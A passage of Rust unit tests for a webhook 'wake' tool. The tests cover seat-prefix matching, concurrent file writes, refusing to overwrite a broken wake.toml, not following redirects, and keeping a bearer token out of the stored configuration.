        let first = first_rx
            .recv_timeout(Duration::from_secs(3))
            .expect("redirect request");
        assert!(first.starts_with("POST /hook"), "{first}");
        assert!(
            target_rx.recv_timeout(Duration::from_millis(700)).is_err(),
            "redirect target was called"
        );
    }

    #[test]
    fn concurrent_writers_and_reader_keep_every_entry() {
        use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
        use std::sync::{Arc, Barrier};

        let (_lock, _dir) = isolated();
        set_command("seed", "true", None).expect("seed");
        let left_payload = "a".repeat(40_000);
        let right_payload = "b".repeat(40_000);

        let done = Arc::new(AtomicBool::new(false));
        let parse_errors = Arc::new(AtomicUsize::new(0));
        let done_reader = Arc::clone(&done);
        let parse_reader = Arc::clone(&parse_errors);
        let reader = std::thread::spawn(move || {
            while !done_reader.load(Ordering::Relaxed) {
                if let Ok(text) = std::fs::read_to_string(path()) {
                    if !text.is_empty() && toml::from_str::<BTreeMap<String, Wake>>(&text).is_err()
                    {
                        parse_reader.fetch_add(1, Ordering::Relaxed);
                    }
                }
                std::hint::spin_loop();
            }
        });

        for round in 0..40 {
            let gate = Arc::new(Barrier::new(2));
            let left_gate = Arc::clone(&gate);
            let right_gate = Arc::clone(&gate);
            let left_cmd = format!("{left_payload}{round}");
            let right_cmd = format!("{right_payload}{round}");
            let left = std::thread::spawn(move || {
                left_gate.wait();
                set_command("alpha", &left_cmd, None).expect("left write");
            });
            let right = std::thread::spawn(move || {
                right_gate.wait();
                set_command("beta", &right_cmd, None).expect("right write");
            });
            left.join().expect("left join");
            right.join().expect("right join");
            let table = load_for_write().expect("table parse");
            assert!(
                table.contains_key("alpha") && table.contains_key("beta"),
                "lost wake entry on round {round}: {table:?}"
            );
        }
        done.store(true, Ordering::Relaxed);
        reader.join().expect("reader join");
        assert_eq!(
            parse_errors.load(Ordering::Relaxed),
            0,
            "reader saw torn writes"
        );
    }

    fn body_of(raw: &str) -> serde_json::Value {
        let body = raw
            .split_once("\r\n\r\n")
            .map(|(_, body)| body)
            .unwrap_or(raw);
        serde_json::from_str(body).unwrap_or_else(|e| panic!("{e}: {raw}"))
    }

    /// Hold the process environment for one wake file in a temp home.
    fn isolated() -> (crate::EnvLock, tempfile::TempDir) {
        let lock = crate::test_env_lock();
        let dir = tempfile::tempdir().expect("home");
        // SAFETY: test_env_lock holds the environment and restores it.
        unsafe {
            std::env::set_var("XDG_CONFIG_HOME", dir.path().join("config"));
            std::env::set_var("XDG_STATE_HOME", dir.path().join("state"));
        }
        (lock, dir)
    }

    #[test]
    fn set_webhook_refuses_to_overwrite_a_broken_wake_toml() {
        let (_lock, _dir) = isolated();
        let wake_file = path();
        std::fs::create_dir_all(wake_file.parent().expect("wake dir")).expect("wake dir");
        let broken = "[inky\nwebhook = \"https://old.example/hook\"\n";
        std::fs::write(&wake_file, broken).expect("seed broken wake");
        let err = set_webhook("inky", "http://127.0.0.1:9/hook", None, None)
            .expect_err("broken wake.toml should refuse writes");
        let said = format!("{err:#}");
        assert!(said.contains("wake"), "{said}");
        assert!(
            said.contains("parse"),
            "the refusal should say this is a parse error: {said}"
        );
        assert_eq!(std::fs::read_to_string(&wake_file).unwrap(), broken);
    }

    #[test]
    fn a_prefix_posts_the_run_seat_and_keeps_the_key_out_of_the_file() {
        let (_lock, _dir) = isolated();
        let (review_port, review_rx) = serve_one();
        let (broad_port, broad_rx) = serve_one();
        let (exact_port, exact_rx) = serve_one();
        let review = format!("http://127.0.0.1:{review_port}/hook");
        let broad = format!("http://127.0.0.1:{broad_port}/hook");
        let exact = format!("http://127.0.0.1:{exact_port}/hook");
        // SAFETY: test_env_lock holds the environment and restores it.
        unsafe { std::env::set_var("LJOS_WAKE_LAUNCHER_KEY", "test-token") };

        let set = set_webhook(
            "ljosbot-review-",
            &review,
            None,
            Some("LJOS_WAKE_LAUNCHER_KEY"),
        )
        .expect("set prefix");
        assert!(
            set.contains("when mail reaches a seat that starts with it"),
            "{set}"
        );
        for seat in ["ljosbot-reviewer", "ljosbot-review", "ljosbot-review-"] {
            let missed = fire(&Event {
                seat: seat.into(),
                ..Event::default()
            });
            let err = format!("{:#}", missed.expect_err("not this prefix"));
            assert!(err.contains(&format!("{seat} has no wake set")), "{err}");
        }
        set_webhook("ljosbot-", &broad, None, None).expect("set broad");
        let own = set_webhook("ljosbot-review-abc", &exact, None, None).expect("set exact");
        assert!(own.ends_with("when mail reaches it\n"), "{own}");
        assert!(!own.contains("starts with"), "{own}");

        let stored = std::fs::read_to_string(path()).expect("wake.toml");
        assert!(!stored.contains("test-token"), "{stored}");
        assert!(stored.contains("ljosbot-review-"), "{stored}");
        let loaded = load();
        assert_eq!(
            matched(&loaded, "ljosbot-review-def"),
            Some("ljosbot-review-")
        );

        let run = Event {
            seat: "ljosbot-review-def".into(),
            from: "inky".into(),
            msg: "m1".into(),
            issue: Some("Software-d9n6".into()),
            interrupt: true,
            commit: None,
        };
        let said = fire(&run).expect("fire run");
        assert!(
            said.starts_with(
                "wake ljosbot-review via ljosbot-review- for ljosbot-review-def: posted, 200"
            ),
            "{said}"
        );
        let posted = review_rx
            .recv_timeout(Duration::from_secs(3))
            .expect("review hook");
        assert!(
            posted
                .to_ascii_lowercase()
                .contains("authorization: bearer test-token"),
            "{posted}"
        );
        let v = body_of(&posted);
        assert_eq!(v["seat"], "ljosbot-review-def");
        assert_eq!(v["from"], "inky");
        assert_eq!(v["msg"], "m1");
        assert_eq!(v["issue"], "Software-d9n6");
        assert_eq!(v["interrupt"], true);
        assert_eq!(v["read"], "LJOS_SEAT='ljosbot-review-def' ljos inbox");
        assert_eq!(v["via"], "ljosbot-review-");
        assert!(v.get("body").is_none() && v.get("text").is_none(), "{v}");
        assert!(broad_rx.try_recv().is_err(), "a longer prefix lost");

        let shown = show("ljosbot-review-def");
        assert!(
            shown.contains("matches ljosbot-review-") && shown.contains(&review),
            "{shown}"
        );
        let log = std::fs::read_to_string(log_path()).unwrap_or_default();
        assert!(
            log.contains("ljosbot-review via ljosbot-review- for ljosbot-review-def"),
            "{log}"
        );

        let other = fire(&Event {
            seat: "ljosbot-fix-9".into(),
            from: "inky".into(),
            msg: "m2".into(),
            ..Event::default()
        })
        .expect("fire broad");
        assert!(
            other.starts_with("wake ljosbot via ljosbot- for ljosbot-fix-9: posted, 200"),
            "{other}"
        );
        let posted = broad_rx
            .recv_timeout(Duration::from_secs(3))
            .expect("broad hook");
        assert_eq!(body_of(&posted)["seat"], "ljosbot-fix-9");

        let own = fire(&Event {
            seat: "ljosbot-review-abc".into(),
            from: "inky".into(),
            msg: "m3".into(),
            ..Event::default()
        })
        .expect("fire exact");
        assert!(
            own.starts_with("wake ljosbot-review-abc: posted, 200"),
            "{own}"
        );
        let posted = exact_rx
            .recv_timeout(Duration::from_secs(3))
            .expect("exact hook");
        let v = body_of(&posted);
        assert_eq!(v["seat"], "ljosbot-review-abc");
        assert!(v.get("via").is_none(), "{v}");
        assert!(
            !posted.to_ascii_lowercase().contains("authorization:"),
            "{posted}"
        );

        let missed = fire(&Event {
            seat: "other-1".into(),
            ..Event::default()
        });
        let err = format!("{:#}", missed.expect_err("other-1 has no prefix"));
        assert!(err.contains("other-1 has no wake set"), "{err}");
    }

    #[test]
    fn clear_names_the_prefix_when_the_seat_has_no_own_wake() {
        let (_lock, _dir) = isolated();
        set_webhook("ljosbot-review-", "http://127.0.0.1:9/hook", None, None).expect("set prefix");
        let said = clear("ljosbot-review-abc").expect("clear");
        assert!(
            said.contains("matches ljosbot-review-")
                && said.contains("clear ljosbot-review- to remove it"),
            "{said}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_send_starts_the_prefix_wake_for_a_run_seat() {
        use std::os::unix::fs::PermissionsExt;
        let (_lock, dir) = isolated();
        let marker = dir.path().join("spawn.log");
        let script = dir.path().join("record-wake");
        std::fs::write(
            &script,
            "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$WAKE_RECORD\"\n",
        )
        .expect("script");
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        // SAFETY: test_env_lock holds the environment and restores it.
        unsafe {
            std::env::set_var("LJOS_WAKE_BIN", &script);
            std::env::set_var("WAKE_RECORD", &marker);
        }
        set_webhook("ljosbot-review-", "http://127.0.0.1:9/hook", None, None).expect("prefix");
        set_webhook("inky", "http://127.0.0.1:9/inky", None, None).expect("exact");

        let event = |seat: &str| Event {
            seat: seat.to_string(),
            from: "inky".into(),
            msg: "m1".into(),
            issue: Some("Software-d9n6".into()),
            interrupt: false,
            commit: None,
        };
        let missed = spawn(&[event("ljosbot-reviewer"), event("ljosbot")]);
        assert!(missed.is_empty(), "{missed:?}");
        let woken = spawn(&[event("ljosbot-review-abc"), event("inky")]);
        assert_eq!(
            woken,
            vec![
                "ljosbot-review via ljosbot-review- for ljosbot-review-abc".to_string(),
                "inky".to_string()
            ]
        );

        let started = Instant::now();
        let wrote = loop {
            if let Ok(text) = std::fs::read_to_string(&marker) {
                if text.lines().count() >= 2 {
                    break text;
                }
            }
            assert!(
                started.elapsed() < Duration::from_secs(3),
                "the wake did not start"
            );
            std::thread::sleep(Duration::from_millis(20));
        };
        assert!(wrote.contains("wake ljosbot-review-abc --fire"), "{wrote}");
        assert!(wrote.contains("wake inky --fire"), "{wrote}");
        assert!(!wrote.contains("ljosbot-reviewer"), "{wrote}");
        assert!(!wrote.contains("wake ljosbot --fire"), "{wrote}");
    }
}
